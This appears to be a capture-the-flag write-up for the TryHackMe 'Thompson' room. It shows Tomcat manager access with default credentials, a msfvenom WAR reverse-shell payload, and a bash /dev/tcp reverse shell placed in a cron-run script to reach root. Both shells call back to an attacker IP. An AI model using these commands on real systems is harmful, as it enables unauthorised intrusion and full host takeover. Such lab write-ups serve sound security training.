# [Challenge](https://tryhackme.com/room/bsidesgtthompson)

- # ENUM
	- ### nmap (`nmap -A -p- -T4 --min-rate 5000 thompson`)
		- 22 -> ssh
		- 8009 -> ajp13
		- 8080 -> http (Tomcat 8.5.5)
	
- # EXPLOITATION
	Let's search on `searchsploit` if there's a vulnerability in Tomcat 8.5.5: `CVE-2017-12617`
	It's not vulnerable :\
	Let's check further on the website: there's a page called `/manager`. The credentials are the default ones, `tomcat:s3cret`.
	In the management page there's a file upload form (WAR, 'cause Tomcat it's a java server), so let's [generate](https://www.revshells.com/) a revshell: `msfvenom -p java/shell_reverse_tcp LHOST=10.17.32.83 LPORT=4444 -f war -o shell.war` and upload it: we're in!
	First, let's spawn a bash: `python3 -c "import pty; pty.spawn('/bin/bash')"` and read the user flag.

- # PRIVILEGE ESCALATION
	As `tomcat`, we can't `sudo -l`. Let's check the SUID bits: `find / -perm -4000 -print 2>/dev/null`.
	There's an interesting script: `/home/jack/id.sh`. Let's run `linpeas.sh`: there's a cronjob that executes `id.sh` every minute! Let's modify the file so we can get a root shell:
	```bash
	#!/bin/bash
	bash -i >& /dev/tcp/10.17.32.83/8888 0>&1
	```
	Let's wait and... we're ROOT!
	